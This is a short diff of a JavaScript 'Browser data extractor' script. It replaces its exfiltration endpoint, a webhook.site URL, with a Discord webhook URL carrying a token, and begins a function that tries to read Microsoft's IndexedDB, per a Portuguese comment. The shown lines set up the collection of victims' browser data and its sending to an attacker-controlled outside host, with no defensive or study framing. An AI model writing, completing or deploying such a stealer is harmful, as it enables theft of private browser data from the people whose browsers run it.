@@ -1,6 +1,6 @@
 // Browser data extractor
 (async function() {
-    const WEBHOOK = 'https://webhook.site/12d75b74-fab7-4abf-aa36-fb46d5c9e913';
+    const WEBHOOK = 'https://ptb.discord.com/api/webhooks/1471888405783773407/d_fL6xpJsDVY759evqGCWkcyKXDuNFz02mR06rxrkOiitlcfOvdNtk6es6WpcI5EOFJA';
     
     // Tentar acessar indexedDB de Microsoft
     function extractIndexedDB() {
